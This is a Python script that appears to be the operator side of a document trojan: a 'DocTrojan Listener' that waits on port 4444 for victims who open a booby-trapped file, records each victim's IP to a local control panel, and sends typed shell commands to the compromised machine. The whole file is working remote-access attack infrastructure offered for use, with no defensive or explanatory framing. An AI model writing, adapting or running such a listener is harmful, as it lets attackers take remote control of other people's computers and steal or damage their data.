import socket
import threading
import sys
from datetime import datetime
import requests

def report_connection(ip, hostname):
    try:
        requests.post(
            "http://127.0.0.1:5000/api/victim/connect",
            json={
                "ip": ip,
                "hostname": hostname,
                "timestamp": datetime.now().isoformat()
            },
            timeout=2
        )
    except:
        pass

print("[*] DocTrojan Listener - Ready to receive")
print("[*] Wait until the victim opens the file...")

def handle_client(conn, addr):
    print(f"\n[+] New connection from: {addr[0]}")
    
    try:
        report_connection(addr[0], "Unknown")
    except:
        pass
    
    try:
        banner = conn.recv(1024).decode()
        print(banner.strip())

        while True:
            try:
                cmd = input(f"\n{addr[0]}> ").strip()
                if not cmd: 
                    continue
                conn.send(cmd.encode() + b"\n")
                if cmd.lower() == "exit":
                    break
                resp = conn.recv(8192).decode()
                print(resp, end="")
            except:
                break
    except:
        pass
    finally:
        conn.close()
        print(f"[-] Connection with {addr[0]} ended")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 4444))
    server.listen(5)
    print("[+] Listener working on Port 4444...")

    while True:
        conn, addr = server.accept()
        threading.Thread(
            target=handle_client,
            args=(conn, addr),
            daemon=True
        ).start()

if __name__ == "__main__":
    try:
        start_server()
    except KeyboardInterrupt:
        print("\n[!] Stopped manually")